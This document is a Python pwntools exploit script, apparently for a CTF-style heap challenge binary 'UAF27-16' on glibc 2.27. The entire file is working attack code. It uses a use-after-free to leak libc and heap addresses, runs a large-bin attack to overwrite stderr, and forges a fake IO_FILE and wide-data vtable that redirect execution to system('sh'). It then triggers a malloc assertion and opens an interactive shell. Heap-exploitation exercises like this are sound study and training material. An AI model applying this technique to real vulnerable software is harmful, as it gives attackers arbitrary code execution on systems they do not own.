#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./UAF27-16')
#libc = ELF('./libc-2.27.so')
libc = ELF('./libc-2.27-1.6.so')
elf = ELF('./UAF27-16')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

add(0x418) #0 0x250
add(0x418) #1 0x670
add(0x418) #2 0xa90
add(0x420) #3 0xeb0
add(0x418) #4 0x12e0

delete(1)  #chunk1 放入 unsortedbin
show(1)
libcbase = u64(p.recv(6).ljust(8, "\x00")) - 0x3ebca0
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
stderr = libcbase + libc.sym['stderr']
system = libcbase + libc.sym["system"]
pr('libcbase',libcbase)
add(0x418) #5 use chunk1 0x670

delete(3)
add(0x440) #6 0x1700 让chunk3 进入 largebin
delete(5)  #chunk1放入unsortedbin

show(3)
heapbase = u64(p.recv(24)[-8:].ljust(8, "\x00")) - 0xeb0
pr('heapbase',heapbase)

edit(3, p64(0)*3+p64(stderr -0x20))
add(0x440) #7 0x1b50,chunk1 地址写入 stderr

#=========================fake_IO_FILE=========================

IO_FILE_addr = heapbase + 0x670
_IO_wdoallocbuf_addr = IO_FILE_addr + 0x130

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base, _wide_data->_IO_write_base = 0
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(1) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end, _wide_data->_IO_buf_base = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr) # _wide_data,rax->IO_FILE_addr
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps-0x20) # vtable = _IO_wfile_overflow, __xsputn变成__overflow
fake_IO_FILE  = fake_IO_FILE.ljust(0x120,'\x00')

#======================fake_IO_wdoallocbuf==========================
#rax = [rax+0x130]
fake_IO_wdoallocbuf  = p64(_IO_wdoallocbuf_addr) #rax->_IO_wdoallocbuf_addr
fake_IO_wdoallocbuf  = fake_IO_wdoallocbuf.ljust(0x68, '\x00')
fake_IO_wdoallocbuf += p64(system) #call [rax+0x68]

edit(0, 'A'*0x410+"  sh\x00\x00\x00\x00")
payload = fake_IO_FILE + fake_IO_wdoallocbuf
edit(1, payload )

#chunk6 7 top 合并
delete(6)
delete(7)

add(0x450) #8 use chunk6
#修改top_size大小
edit(7, p64(0)+p64(0x301))

#gdb.attach(p)
#pause()

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x460)) # 触发 malloc 断言
p.interactive()
